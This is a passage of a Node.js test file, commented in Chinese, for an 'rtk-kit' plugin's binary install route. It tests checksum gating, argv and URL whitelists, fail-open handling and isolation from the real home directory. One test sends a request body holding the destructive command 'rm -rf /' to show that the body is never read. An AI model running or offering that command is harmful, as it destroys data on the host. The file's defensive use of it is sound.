    // 路径形 A3 透传=原值，resolve-bin 单源）+ 代码默认落点/超时
    assert.equal(engineCalls[0].rtkBin, '/opt/fake/bin/rtk', '引擎 rtkBin=重发现值（种子=config 原值，A3 显式路径透传）')
    assert.equal(engineCalls[0].installDir, path.join(root, 'bin'), 'installDir 走注入缝（默认 ~/.local/bin）')
    assert.equal(engineCalls[0].logPath, path.join(root, 'install-log.json'), 'logPath 走注入缝（默认 ~/.dsh/dsh-rtk-kit/install-log.json）')
    assert.equal(engineCalls[0].timeoutMs, 60000, 'timeoutMs 代码默认 60000（红线 4：零 Config 新键）')
    assert.equal(engineCalls[0].platform, 'linux')
    assert.equal(engineCalls[0].arch, 'x64')

    // 拆除幂等（INV-8）：重复 dispose 零副作用、底层 disposer 恰一次
    dispose()
    dispose()
    assert.equal(spec.disposeCalls.count, 1)
  })
})

test('Task 3 真 handler：POST install 成功 → {data:{record, verify}} 恰形（真实引擎 + 假 fetch/exec/fs，零真 home）', async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'rtk-apply-install-'))
  await hermetic(root, async () => {
    const installDir = path.join(root, 'bin')
    const logFile = path.join(root, 'install-log.json')
    const newBytes = Buffer.from('#!/bin/sh\necho "rtk 9.9.9"\n')
    const tgzBytes = Buffer.from('fake-rtk-archive-bytes') // 假归档字节（sha256 一致性门照走，解包由假 exec 模拟）
    const sums = checksumsText([[RTK_ASSET, tgzBytes]])
    const fetchCalls = []
    const execCalls = []
    const fsCalls = []
    const w = applyWiring({
      rejection: undefined,
      deps: {
        installDir,
        tmpdir: root,
        logPath: logFile,
        timeoutMs: 5000,
        verifyTimeoutMs: 5000,
        now: () => FIXED_MS,
        fetch: fakeFetch(sums, tgzBytes, fetchCalls),
        exec: fakeInstallExec(newBytes, execCalls),
        fs: confinedFs(root, fsCalls),
        resolveEnv: { path: '', homedir: '', isExecutable: () => true },
        platform: 'linux',
        arch: 'x64',
      },
    })
    const dispose = w.run()
    const req = makeReq({ url: `${API_PREFIX}/install`, method: 'POST', body: '{"evil":"rtk run rm -rf /"}' })
    const res = await callSpec(w.routeSpec(), req)

    // 成功信封恰形（跨卡契约 3）：{data:{record, verify}}
    assert.equal(res.status, 200)
    assert.deepEqual(Object.keys(res.body), ['data'])
    assert.deepEqual(Object.keys(res.body.data).sort(), ['record', 'verify'])
    assert.deepEqual(res.body.data.record, { time: FIXED_ISO, version: '9.9.9', source: releaseAssetUrl(RTK_ASSET), ok: true, error: null })
    assert.deepEqual(res.body.data.verify, { available: true, version: '9.9.9', path: path.join(installDir, 'rtk'), hint: null }, 'verify.path=targetPath（Ruling c：复检直指落盘目标）')
    assert.equal(req.reads.count, 0, 'POST body 一律不读（INV-7：永无路径进入 argv/URL）')

    // URL 白名单（INV-2）：下载源只由固定资产名常量拼出，零用户输入
    assert.deepEqual(fetchCalls, [releaseAssetUrl(CHECKSUMS_ASSET), releaseAssetUrl(RTK_ASSET)])

    // argv 白名单（INV-7）：tar 固定 argv + 复检 --version；零 shell 元字符拼接、零透传执行
    assert.equal(execCalls.length, 2)
    assert.equal(execCalls[0].file, 'tar')
    assert.equal(execCalls[0].args[0], '-xzf')
    assert.equal(execCalls[0].args[2], '-C')
    assert.ok(execCalls[0].args.every((s) => !/[\n;|&$`]/.test(s)), '零 shell 元字符拼接')
    assert.deepEqual(execCalls[1], { file: path.join(installDir, 'rtk'), args: ['--version'] }, '复检直指落盘 targetPath（Ruling c：多二进制共存不串味）')

    // 落盘面：原子替换到注入 installDir；fs 写面全在 mkdtemp root 内（confinedFs 逐调用锁）
    assert.ok(fsCalls.some((c) => c.method === 'copyFile' && c.args[1].startsWith(root)), '中转文件在注入落点')
    assert.ok(fsCalls.some((c) => c.method === 'rename' && c.args[1] === path.join(installDir, 'rtk')), '原子落盘到注入 installDir')

    // 记录面（INV-10）：成功记录落注入 logPath（零真 home），条目恰白名单字段
    const entries = JSON.parse(fs.readFileSync(logFile, 'utf8'))
    assert.equal(entries.length, 1)
    assert.deepEqual(Object.keys(entries[0]).sort(), ['error', 'ok', 'source', 'time', 'version'])
    assert.deepEqual(entries[0], { time: FIXED_ISO, version: '9.9.9', source: releaseAssetUrl(RTK_ASSET), ok: true, error: null })

    dispose()
    dispose()
    assert.equal(w.routeSpec().disposeCalls.count, 1)
  })
})

test('Task 3 真 handler：POST install 失败 → 分类 {error:{code:"CHECKSUM_MISMATCH"}}（502 + 失败记录落盘，零 data）', async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'rtk-apply-fail-'))
  await hermetic(root, async () => {
    const installDir = path.join(root, 'bin')
    const logFile = path.join(root, 'install-log.json')
    const tgzBytes = Buffer.from('fake-rtk-archive-bytes')
    const sums = checksumsText([[RTK_ASSET, Buffer.from('mismatch-bytes')]]) // 校验门：hash 不匹配绝不落盘
    const execCalls = []
    const w = applyWiring({
      rejection: undefined,
      deps: {
        installDir,
        tmpdir: root,
        logPath: logFile,
        timeoutMs: 5000,
        verifyTimeoutMs: 5000,
        now: () => FIXED_MS,
        fetch: fakeFetch(sums, tgzBytes),
        exec: fakeInstallExec(Buffer.from('never'), execCalls),
        fs: confinedFs(root),
        resolveEnv: { path: '', homedir: '', isExecutable: () => true },
        platform: 'linux',
        arch: 'x64',
      },
    })
    w.run()
    const res = await callSpec(w.routeSpec(), makeReq({ url: `${API_PREFIX}/install`, method: 'POST', body: '{}' }))

    // 失败信封分类（跨卡契约 3）：{error:{code,message[,hint],verify?,record?,backupPath?}}，零 data
    assert.equal(res.status, 502, 'INSTALL_ERROR_STATUS 收口 HTTP 语义（上游校验失败 502）')
    assert.deepEqual(Object.keys(res.body), ['error'], '失败信封不得混入 data')
    assert.equal(res.body.error.code, 'CHECKSUM_MISMATCH', '前端 code 分派单源（分类码原样）')
    assert.equal(typeof res.body.error.message, 'string')
    assert.equal(res.body.error.record.ok, false)
    assert.equal(res.body.error.record.error, 'CHECKSUM_MISMATCH')
    assert.equal(execCalls.length, 0, '校验不过绝不进解包（不落盘）')
    assert.ok(!fs.existsSync(path.join(installDir, 'rtk')), '校验不过绝不落盘（INV-2/3）')

    // 失败也记（US-5 / INV-10）：失败记录落注入 logPath
    const entries = JSON.parse(fs.readFileSync(logFile, 'utf8'))
    assert.equal(entries.length, 1)
    assert.equal(entries[0].ok, false)
    assert.equal(entries[0].error, 'CHECKSUM_MISMATCH')
  })
})

test('Task 3 fail-open（INV-4）：坏引擎（装载期抛）→ 接线不抛、留痕、其余工具面照常（恒等放行零回归）', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'rtk-apply-badengine-'))
  const badDeps = { logPath: path.join(root, 'install-log.json'), installDir: path.join(root, 'bin'), tmpdir: root }
  Object.defineProperty(badDeps, 'installEngine', { get() { throw new Error('引擎装载失败') } })
  const w = applyWiring({
    rejection: undefined,
    deps: badDeps,
    config: { registerDoctorTool: true, awareness: 'default' },
  })
  let dispose
  assert.doesNotThrow(() => { dispose = w.run() }, '引擎装载失败只留痕不炸插件（INV-4）')
  assert.equal(typeof dispose, 'function', 'fail-open 也交拆除器（noop、幂等）')
  assert.doesNotThrow(() => dispose())
  assert.doesNotThrow(() => dispose())
  assert.ok(
    w.ctx.warnings.some((m) => /设置页数据面注册失败/.test(m) && /引擎装载失败/.test(m)),
    '留痕含失败原因（fail-open 只 logger.warn）',
  )
  assert.equal(w.ctx.registered.length, 0, '注册失败=零残留')
  // 其余工具面照常：会话工具（rtk_doctor）/ awareness 注入缝 / resolve 改写缝
  assert.equal(w.ctx.toolCalls.length, 1, 'rtk_doctor 照常注册（零新增 defineTool）')
  assert.equal(w.ctx.toolCalls[0][0].name, 'rtk_doctor')
  assert.equal(w.ctx.onCalls.length, 1, 'awareness 注入缝照常挂载')
  // fail-open 零回归：rtk 不可用（enabled:false）= 自动改写恒等放行
  assert.notEqual(w.ctx.shell.resolve, w.origResolve, 'resolve 改写包壳仍在')
  const req = { command: 'git status', stdin: null }
  assert.deepEqual(w.ctx.shell.resolve(req), req, '恒等放行（fail-open 零回归）')
})

test('Task 3 fail-open（INV-4）：坏注册（webServer.register 抛）→ 接线不抛、留痕、其余工具面照常', () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'rtk-apply-badreg-'))
  const w = applyWiring({
    rejection: undefined,
    deps: { logPath: path.join(root, 'install-log.json'), installDir: path.join(root, 'bin'), tmpdir: root, installEngine: async () => STUB_OK },
    config: { registerDoctorTool: true, awareness: 'off' },
    subTweak: (sub) => {
      sub.webServer = {
        register() {
          throw new Error('webServer.register 炸了')
        },
      }
    },
  })
  let dispose
  assert.doesNotThrow(() => { dispose = w.run() }, '路由注册失败只留痕不炸插件（INV-4）')
  assert.equal(typeof dispose, 'function')
  assert.doesNotThrow(() => dispose())
  assert.doesNotThrow(() => dispose())
  assert.ok(
    w.ctx.warnings.some((m) => /设置页数据面注册失败/.test(m) && /webServer\.register 炸了/.test(m)),
    '留痕含失败原因',
  )
  assert.equal(w.ctx.registered.length, 0, '注册失败=零残留')
  assert.equal(w.ctx.toolCalls.length, 1, '其余工具面照常')
  const req = { command: 'git status', stdin: null }
  assert.deepEqual(w.ctx.shell.resolve(req), req, '改写恒等放行照常')
})

test('Task 3 fail-open（INV-4）：坏引擎（调用期抛）→ POST install 回分类错误信封、不炸插件', async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'rtk-apply-callfail-'))
  await hermetic(root, async () => {
    const logFile = path.join(root, 'install-log.json')
    let n = 0
    const w = applyWiring({
      rejection: undefined,
      deps: {
        logPath: logFile,
        installDir: path.join(root, 'bin'),
        tmpdir: root,
        platform: 'linux',
        arch: 'x64',
        installEngine: () => {
          n += 1
          if (n === 1) throw Object.assign(new Error('引擎执行炸了'), { code: 'DOWNLOAD_FAILED' })
          throw new Error('未分类炸了')
        },
      },
    })
    const dispose = w.run()
    const spec = w.routeSpec()
    const r1 = await callSpec(spec, makeReq({ url: `${API_PREFIX}/install`, method: 'POST', body: '{}' }))
    assert.equal(r1.status, 502)
    assert.deepEqual(Object.keys(r1.body), ['error'])
    assert.equal(r1.body.error.code, 'DOWNLOAD_FAILED', '分类码原样收口')
    assert.equal(r1.body.error.message, '引擎执行炸了')
    const r2 = await callSpec(spec, makeReq({ url: `${API_PREFIX}/install`, method: 'POST', body: '{}' }))
    assert.equal(r2.status, 500)
    assert.equal(r2.body.error.code, 'RTK_ERROR', '未分类归 RTK_ERROR')
    assert.equal(n, 2, '两次都真进引擎（不吞调用、不卡死）')
    assert.ok(!fs.existsSync(logFile), '非安装尝试零记录落盘（重入/装载失败口径）')
    assert.doesNotThrow(() => dispose())
    assert.doesNotThrow(() => dispose())
  })
})

test('Task 3 真实宿主接缝：apply() 注册/鉴权调用形与 registerDoctorRoutes 直注册同形', async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'rtk-apply-seam-'))
  await hermetic(root, async () => {
    const engineCalls = []
    const w = applyWiring({
      rejection: undefined,
      deps: {
        logPath: path.join(root, 'install-log.json'),
        installDir: path.join(root, 'bin'),
        tmpdir: root,
        platform: 'linux',
        arch: 'x64',
        installEngine: async (opts) => {
          engineCalls.push(opts)
          return STUB_OK
        },
      },
    })
    const dispose = w.run()
    const spec = w.routeSpec()

    // 注册面同形：webServer.register({kind, path, handler}) 键集与直注册一致（真实宿主接缝形）
    const direct = makeCtx()
    registerDoctorRoutes(direct, {
      installOpts: { logPath: path.join(root, 'direct-log.json') },
      installEngine: async () => STUB_OK,
      platform: 'linux',
      arch: 'x64',
    })
    assert.deepEqual(Object.keys(spec).sort(), Object.keys(direct.registered[0]).sort(), '注册面键集同形')
    assert.equal(spec.kind, direct.registered[0].kind)
    assert.equal(spec.path, direct.registered[0].path)
    assert.equal(typeof direct.registered[0].handler, 'function')

    // 鉴权缝调用形（真 handler 过缝）：connection.requestRejection({headers})
    const req = makeReq({ url: `${API_PREFIX}/install`, method: 'POST', body: '{}' })
    await callSpec(spec, req)
    assert.deepEqual(w.ctx.rejectionCalls[0], { headers: req.headers }, 'requestRejection({headers}) 缝形')
    assert.equal(engineCalls[0].rtkBin, '/opt/fake/bin/rtk', '引擎 rtkBin=重发现值（种子=config 原值，resolve-bin 单源，A3 透传）')

    dispose()
    dispose()
    assert.equal(spec.disposeCalls.count, 1)
  })
})

test('Task 3 红线：零 defineTool 新增、零 spawnSync 新增、cordis.patch.yml 字节零改动、package.json 依赖面零新增、Config 零新键、URL/错误码契约', () => {
  assert.equal(INDEX_SOURCE.match(/\bdefineTool\s*\(/g)?.length ?? 0, 1, 'defineTool 全库恰一处（零新增会话工具，INV-1）')
  assert.equal(INDEX_SOURCE.match(/\bspawnSync\s*\(/g)?.length ?? 0, 2, 'spawnSync 调用点零新增（仍恰 probeRtk/runRtkRewrite 两处）')
  // 字节锁（Task 3 基线 2026-10-04）：cordis.patch.yml 本变更期间字节零改动（红线 4）——永不动。
  const fileSha = (rel) => sha256Hex(fs.readFileSync(new URL(rel, import.meta.url)))
  assert.equal(fileSha('../cordis.patch.yml'), '38a6127ad02e7800dd53b3428401af110d5f0c41c55813b4cd6032d87863cf94', 'cordis.patch.yml 字节零改动')
  // package.json 语义锁（concern ① 裁决 2026-10-04）：version 属发版簿记面，故锁依赖面不锁字节——
  // dependencies/peerDependencies/devDependencies 三面 deepEqual 基线（=零新依赖）。
  const pkg = JSON.parse(fs.readFileSync(new URL('../package.json', import.meta.url), 'utf8'))
  assert.deepEqual(pkg.dependencies, { zod: '^4.3.6' }, 'dependencies 面零新增（零新依赖）')
  assert.deepEqual(pkg.peerDependencies, {
    '@deepseek-ai/dsh-tools': '>=0.1.0-rc.1 <0.3.0-0',
    '@deepseek-ai/dsh-llm': '>=0.1.0-rc.1 <0.3.0-0',
  }, 'peerDependencies 面零新增（零新依赖）')
  assert.deepEqual(pkg.devDependencies, {
    '@deepseek-ai/dsh-tools': 'link:/usr/local/lib/node_modules/@deepseek-ai/dsh/node_modules/@deepseek-ai/dsh-tools',
    '@deepseek-ai/dsh-llm': 'link:/usr/local/lib/node_modules/@deepseek-ai/dsh/node_modules/@deepseek-ai/dsh-llm',
  }, 'devDependencies 面零新增（零新依赖）')
  assert.deepEqual(
    Object.keys(Config.shape).sort(),
    ['awareness', 'conservative', 'doctorGain', 'enabled', 'exclude', 'registerDoctorTool', 'rewriteTimeoutMs', 'rtkBin'],
    'Config 零新键（红线 4：落点/超时全走代码默认 + opts 注入缝）',
  )
  // 跨卡契约 2/3（Task 2 复审逐字口径）：URL 常量 + 错误码族单源
  assert.equal(INSTALL_URL, 'api/rtk-kit/install')
  assert.ok(!INSTALL_URL.startsWith('/'), '文档相对、无前导斜杠（issue #1707 教训）')
  assert.deepEqual({ ...INSTALL_ERROR_STATUS }, {
    PLATFORM_UNSUPPORTED: 400,
    DOWNLOAD_FAILED: 502,
    CHECKSUM_MISMATCH: 502,
    EXTRACT_FAILED: 500,
    WRITE_FAILED: 500,
    VERIFY_FAILED: 500,
    'reinstall-in-progress': 409,
  })
})

// ───────────────────────── INV-8 mkdtemp 注入审计（Task 5 收口：全测试面零真 home 写入） ─────────────────────────

test('INV-8 mkdtemp 注入审计：全测试面零真 home 写入（grep 断言：~/.local/bin、~/.dsh 直写零命中）', () => {
  // 写 API 落点扫描（调用首参=落点）：真 home 形（os.homedir()/HOME/~/ /绝对根字面/\.local/\.dsh）零命中
  const WRITE_CALL = /(?:writeFileSync|writeFile|appendFileSync|createWriteStream|mkdirSync|renameSync|rmSync|chmodSync|copyFileSync|mkdtempSync)\s*\(\s*([^,)\n]*)/g
  const REAL_HOME = /homedir|HOME|~\/|\.local|\.dsh|['"`]\//
  // 探测器自检（防正则空转假绿）：真 home 目标必命中、mkdtemp 变量目标必不命中
  assert.match('os.homedir() + "/.local/bin/rtk"', REAL_HOME, '自检：真 home 写目标必命中')
  assert.doesNotMatch('path.join(dir, "install-log.json")', REAL_HOME, '自检：mkdtemp 变量目标必不命中')
  const dir = new URL('.', import.meta.url)
  let writeFiles = 0
  for (const name of fs.readdirSync(dir).filter((f) => f.endsWith('.mjs')).sort()) {
    const src = fs.readFileSync(new URL(name, dir), 'utf8')
    const targets = [...src.matchAll(WRITE_CALL)].map((m) => m[1])
    for (const t of targets) {
      assert.doesNotMatch(t, REAL_HOME, `${name} 写面落点含真 home 形（INV-8 零真 home 写入）：${t}`)
    }
    if (targets.length > 0) {
      writeFiles += 1
      assert.match(src, /mkdtempSync\(/, `${name} 有写面则必 mkdtemp 注入落点（INV-8）`)
    }
  }
  assert.ok(writeFiles >= 3, `写面测试文件在场（审计非空转）：${writeFiles}`)
})

// ───────────────────────── Task 6 fix wave：F-01/F-02/F-03 自愈闭环（Ruling 2026-10-04） ─────────────────────────
// 语义钉死：自愈闭环=功能恢复不等重启——(a) 数据面（version/health/install）每请求 findRtkBin 重解析（stat 级零 spawn）；
// (b) rewrite 缝失能态惰性 stat 复检（仅 available=false 时查，健康路径零开销）；(c) verify 直指 targetPath。
// seam 级测试红线：解析 seam 走真 findRtkBin 逻辑，只注入环境布景（假 home 场景 fs）——禁纯注入缝绕过。

/** 场景布景 resolveEnv（真 findRtkBin 逻辑 + 假 home 场景）：空 PATH + root 兜底 + 场景内可执行判定（真机路径一律不在场）。 */
function sceneEnv(root) {
  return {
    path: '',
    homedir: root,
    isExecutable: (p) => {
      if (!(p === root || p.startsWith(root + path.sep))) return false // 布景隔离：真机候选不在场
      try {
        return fs.statSync(p).isFile() && (fs.statSync(p).mode & 0o111) !== 0
      } catch {
        return false
      }
    },
  }
}

/** 场景 exec：tar 解包模拟（白名单条目 rtk）+ 版本表回答 --version（表外=ENOENT 缺失语义）；零真实子进程。 */
function sceneExec(versions, calls = []) {
  return async (file, args) => {
    calls.push({ file, args })
    const key = args.join(',')
    if (file === 'tar' && args[0] === '-xzf' && args[2] === '-C') {
      const picked = path.join(args[3], 'rtk')
      fs.mkdirSync(args[3], { recursive: true })
      fs.writeFileSync(picked, Buffer.from('#!/bin/sh\necho "rtk 9.9.9"\n'))
      fs.chmodSync(picked, 0o755)
      return { code: 0, stdout: '', stderr: '' }
    }
    if (key === '--version') {
      const v = versions[file]
      if (v) return { code: 0, stdout: `rtk ${v}\n`, stderr: '' }
      throw enoentError()
    }
    throw new Error(`场景 exec 未预期调用：${file} ${key}`)
  }
}

test('Task 6 F-01：boot 真缺失→重装成功→GET version 回 available:true+新版本（数据面每请求重解析自愈，不等重启）', async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'rtk-f01-'))
  await hermetic(root, async () => {
    const installBin = path.join(root, '.local', 'bin') // 与 resolve-bin 官方落点候选同构（fallbackCandidates）
    const landed = path.join(installBin, 'rtk')
    const logFile = path.join(root, 'install-log.json')
    const tgzBytes = Buffer.from('fake-rtk-archive')
    const sums = checksumsText([[RTK_ASSET, tgzBytes]])
    const w = applyWiring({
      rejection: undefined,
      config: { rtkBin: 'rtk' },
      deps: {
        installDir: installBin,
        tmpdir: root,
        logPath: logFile,
        timeoutMs: 5000,
        verifyTimeoutMs: 5000,
        now: () => FIXED_MS,
        fetch: fakeFetch(sums, tgzBytes),
        exec: sceneExec({ [landed]: '9.9.9' }),
        fs: confinedFs(root),
        resolveEnv: sceneEnv(root),
        platform: 'linux',
        arch: 'x64',
      },
    })
    w.run()
    const spec = w.routeSpec()

    // boot 真缺失（真 findRtkBin 布景：空 PATH + 假 home 场景，全候选不在场）
    const before = await callSpec(spec, makeReq({ url: `${API_PREFIX}/version` }))
    assert.equal(before.status, 200)
    assert.deepEqual(
      { available: before.body.data.available, version: before.body.data.version, path: before.body.data.path, hint: before.body.data.hint },
      { available: false, version: null, path: 'rtk', hint: INSTALL_HINT },
      'boot 缺失=软回 + 安装提示（F-01 现象：故障条+按钮再现的起点）',
    )

    // 点击重装（真实引擎 + 假 IO）→ 落盘场景 ~/.local/bin/rtk
    const inst = await callSpec(spec, makeReq({ url: `${API_PREFIX}/install`, method: 'POST', body: '{}' }))
    assert.equal(inst.status, 200)
    assert.equal(inst.body.data.verify.available, true)
    assert.equal(inst.body.data.verify.version, '9.9.9')

    // F-01 核心：GET version 每请求重解析 → available:true + 新版本（修复前仍回 false=故障条+按钮再现）
    const after = await callSpec(spec, makeReq({ url: `${API_PREFIX}/version` }))
    assert.equal(after.status, 200)
    assert.equal(after.body.data.available, true, '装后 version 面自愈（F-01 blocker 闭环）')
    assert.equal(after.body.data.version, '9.9.9')
    assert.equal(after.body.data.path, landed, 'path=本次实际执行二进制（每请求重解析）')
    assert.equal(after.body.data.hint, null)
    assert.equal(after.body.data.lastInstall.ok, true, '同屏记录行「成功」与故障条消失口径一致（F-01 现象面）')
  })
})

test('Task 6 F-01b：boot 真缺失→外部手装（手动落盘）→GET version 自愈 available:true（Ruling：手装也自愈）', async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'rtk-f01b-'))
  await hermetic(root, async () => {
    const installBin = path.join(root, '.local', 'bin')
    const landed = path.join(installBin, 'rtk')
    const w = applyWiring({
      rejection: undefined,
      config: { rtkBin: 'rtk' },
      deps: {
        installDir: installBin,
        tmpdir: root,
        logPath: path.join(root, 'install-log.json'),
        exec: sceneExec({ [landed]: '7.7.7' }),
        resolveEnv: sceneEnv(root),
        platform: 'linux',
        arch: 'x64',
      },
    })
    w.run()
    const before = await callSpec(w.routeSpec(), makeReq({ url: `${API_PREFIX}/version` }))
    assert.equal(before.body.data.available, false, '手装前=缺失（软回不抛）')
    // 外部手装：用户手动放一个可执行 rtk（不走 install 路由）
    fs.mkdirSync(path.dirname(landed), { recursive: true })
    fs.writeFileSync(landed, Buffer.from('#!/bin/sh\necho "rtk 7.7.7"\n'))
    fs.chmodSync(landed, 0o755)
    const after = await callSpec(w.routeSpec(), makeReq({ url: `${API_PREFIX}/version` }))
    assert.equal(after.body.data.available, true, '手装后自愈（每请求重解析，不等重启）')
    assert.equal(after.body.data.version, '7.7.7')
    assert.equal(after.body.data.path, landed)
    assert.equal(after.body.data.hint, null)
  })
})

test('布景隔离自检（fix round 3 seam 锁）：真 apply 接线的数据面 handler 必走注入 exec——解析与执行零触碰 root 外路径', async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'rtk-isolation-'))
  await hermetic(root, async () => {
    const installBin = path.join(root, '.local', 'bin')
    const landed = path.join(installBin, 'rtk')
    const execCalls = []
    const w = applyWiring({
      rejection: undefined,
      config: { rtkBin: 'rtk' },
      deps: {
        installDir: installBin,
        tmpdir: root,
        logPath: path.join(root, 'install-log.json'),
        // 布景 exec：表外一律 ENOENT + 逐调用记录（判别力来源——真机二进制若被解析到必现形）
        exec: sceneExec({ [landed]: '9.9.9' }, execCalls),
        resolveEnv: sceneEnv(root),
        platform: 'linux',
        arch: 'x64',
      },
    })
    w.run()
    const res = await callSpec(w.routeSpec(), makeReq({ url: `${API_PREFIX}/version` }))

    // ① 执行缝真进 handler：注入执行器被调用（pre-fix 零调用 = 走真实 execFile = 布景泄漏）
    assert.equal(execCalls.length, 1, '数据面 handler 必走注入 exec（零注入=走真机 execFile，布景泄漏）')
    assert.ok(
      execCalls[0].file === 'rtk' || execCalls[0].file === landed,
      `执行目标是布景内的解析结果（file=${execCalls[0].file}）`,
    )
    assert.ok(!execCalls[0].file.includes(realHome()), `执行目标不得落在真 home：${execCalls[0].file}`)

    // ② 解析零触碰 root 外：boot 真缺失（全布景候选不在场）→ 软回 + 安装提示
    assert.deepEqual(
      { available: res.body.data.available, version: res.body.data.version, hint: res.body.data.hint },
      { available: false, version: null, hint: INSTALL_HINT },
      '布景内 boot 真缺失（真机 PATH 上的 rtk 不得被解析到）',
    )
    // ③ 真机版本字面零泄漏（真机 0.49.0 若出现=布景泄漏到真机的确定性信号）
    assert.notEqual(res.body.data.version, realRtkVersion(), '真机 rtk 版本不得出现在布景响应里（布景泄漏判据）')
  })
})

/** 真 home（仅用于隔离自检的「不得命中」判据；本函数自身零写）。 */
function realHome() {
  return process.env.REAL_HOME ?? os.homedir()
}

/**
 * 真机 rtk 版本字面（布景泄漏判据）：只在真机确有 rtk 时给出其版本字符串，否则回 null
 * （回 null 时断言自动不触发——不误伤「真机无 rtk」的环境，也不弱化「真机有 rtk」时的判别力）。
 * 取法=读真机 PATH 上的 rtk 文件字节后扫版本字面（零 spawnSync、零执行，纯 fs 只读）。
 */
function realRtkVersion() {
  for (const dir of (process.env.PATH ?? '').split(path.delimiter)) {
    if (!dir) continue
    const p = path.join(dir, 'rtk')
    try {
      if (!fs.statSync(p).isFile()) continue
      const m = fs.readFileSync(p, 'utf8').match(/(\d+\.\d+\.\d+)/)
      return m ? m[1] : null
    } catch {
      /* 无权限/非文件：换下一个 PATH 项 */
    }
  }
  return null
}

test('Task 6 F-03/Ruling b：rewrite 缝失能→落盘→惰性 stat 复检翻转→runRtkRewrite 真执行（自愈不等重启）', async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'rtk-f03-'))
  await hermetic(root, async () => {
    const binPath = path.join(root, 'bin', 'rtk') // 显式配置形（A3）：boot 探针确定性、零真机耦合
    fs.mkdirSync(path.dirname(binPath), { recursive: true })
    const ctx = makeCtx()
    const pluginCalls = []
    ctx.plugin = (s) => pluginCalls.push(s)
    // enabled:true 真 probeRtk（spawnSync 显式路径 → ENOENT）→ 装载期失能
    apply(ctx, { enabled: true, registerDoctorTool: false, awareness: 'off', rtkBin: binPath, rewriteTimeoutMs: 2000 }, { resolveEnv: { path: '', homedir: '' } })
    const req = { command: 'git status', stdin: null }
    assert.deepEqual(ctx.shell.resolve(req), req, 'boot 失能=恒等放行（fail-open 零回归）')

    // 装后/手动落盘（假 rtk 脚本：rewrite <cmd> → 输出改写；--version → 版本）
    fs.writeFileSync(binPath, Buffer.from('#!/bin/sh\nif [ "$1" = "--version" ]; then echo "rtk 1.0.0"; exit 0; fi\nif [ "$1" = "rewrite" ]; then echo "rtk $2"; exit 0; fi\nexit 1\n'))
    fs.chmodSync(binPath, 0o755)

    // 惰性 stat 复检翻转（仅失能态查，stat 级零 spawn）→ runRtkRewrite 真执行（真 spawnSync 假脚本，零真实 rtk）
    assert.deepEqual(ctx.shell.resolve(req), { ...req, command: 'rtk git status' }, 'F-03 自愈：改写缝翻转 + 真执行改写结果')
  })
})

// ───────────────────────── 终审 fix 波（fix round 2，F-FINAL-1）：种子钉死窗口闭环 ─────────────────────────
// Ruling（2026-10-04）：(i) 数据面/惰性翻转重解析种子=config 原值（缺省裸名每请求重发现，A3 显式值透传零覆盖）；
// (ii) 按钮门控收窄=种子显式路径形 且 该路径缺失 且 ≠ 引擎 targetPath → installTargetMatch:false（按钮不出+手动提示）。
// seam 级红线同前：解析走真 findRtkBin 逻辑（只注入环境布景）；改写缝走真 spawnSync 假脚本。

/** 双模假 rtk 脚本（--version 答版本 / rewrite 答改写）：供落盘位真实 spawnSync 执行（零真实 rtk）。 */
const DUAL_SCRIPT = '#!/bin/sh\nif [ "$1" = "--version" ]; then echo "rtk 9.9.9"; exit 0; fi\nif [ "$1" = "rewrite" ]; then echo "rtk $2"; exit 0; fi\nexit 1\n'

test('F-FINAL-1(i) 窗口a：boot 发现命中具体路径→中途被删→装落 ~/.local/bin→GET version 自愈 available:true+惰性翻转改写真执行（种子=config 原值每请求重发现）', async () => {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'rtk-ff1a-'))
  await hermetic(root, async () => {
    const pathbin = path.join(root, 'pathbin')
    const bootBin = path.join(pathbin, 'rtk')
    const installBin = path.join(root, '.local', 'bin')
    const landed = path.join(installBin, 'rtk')
    fs.mkdirSync(pathbin, { recursive: true })
    // 窗口构造：boot 发现从 PATH 命中具体路径（source:'path'）；探针失败形（--version exit 1）→ 装载期 available=false（惰性翻转缝在场）
    fs.writeFileSync(bootBin, Buffer.from('#!/bin/sh\nexit 1\n'))
    fs.chmodSync(bootBin, 0o755)
    const resolveEnv = sceneEnv(root) // 布景内 isExecutable（真机候选一律不在场）
    resolveEnv.path = pathbin // PATH 顺位命中 bootBin（种子被钉死到具体路径的窗口条件）
    const tgzBytes = Buffer.from('fake-rtk-archive-ff1a')
    const sums = checksumsText([[RTK_ASSET, tgzBytes]])
    // 数据面 exec 缝：boot 位答 spawn 级失败（与探针失败形一致）；落盘位答 9.9.9；tar 解包模拟产双模脚本
    const exec = async (file, args) => {
      const key = args.join(',')
      if (file === 'tar' && args[0] === '-xzf' && args[2] === '-C') {
        fs.mkdirSync(args[3], { recursive: true })
        const picked = path.join(args[3], 'rtk')
        fs.writeFileSync(picked, Buffer.from(DUAL_SCRIPT))
        fs.chmodSync(picked, 0o755)
        return { code: 0, stdout: '', stderr: '' }
      }
      if (key === '--version') {
        if (file === landed) return { code: 0, stdout: 'rtk 9.9.9\n', stderr: '' }
        // boot 位「在位但版本不可见」损坏形 = 真实脚本 `exit 1`（非零退出 **resolve**，非 spawn 级 reject）：
        //   抛 ENOENT 是「spawn 失败=不在场」语义，与本窗口「在位」条件相悖（fix round 3：exec 注入缝
        //   修正后本存根才真进 handler，此前靠真机 execFile 跑真 boot 脚本凑出该形——假绿）。
        if (file === bootBin) return { code: 1, stdout: '', stderr: '' }
        throw enoentError()
      }
      throw new Error(`窗口a exec 未预期调用：${file} ${key}`)
    }
    const w = applyWiring({
      rejection: undefined,
      config: { enabled: true, rtkBin: 'rtk', rewriteTimeoutMs: 2000 },
      deps: {
        installDir: installBin,
        tmpdir: root,
        logPath: path.join(root, 'install-log.json'),
        timeoutMs: 5000,
        verifyTimeoutMs: 5000,
        now: () => FIXED_MS,
        fetch: fakeFetch(sums, tgzBytes),
        exec,
        fs: confinedFs(root),
        resolveEnv,
        platform: 'linux',
        arch: 'x64',
      },
    })
    w.run()
    const spec = w.routeSpec()

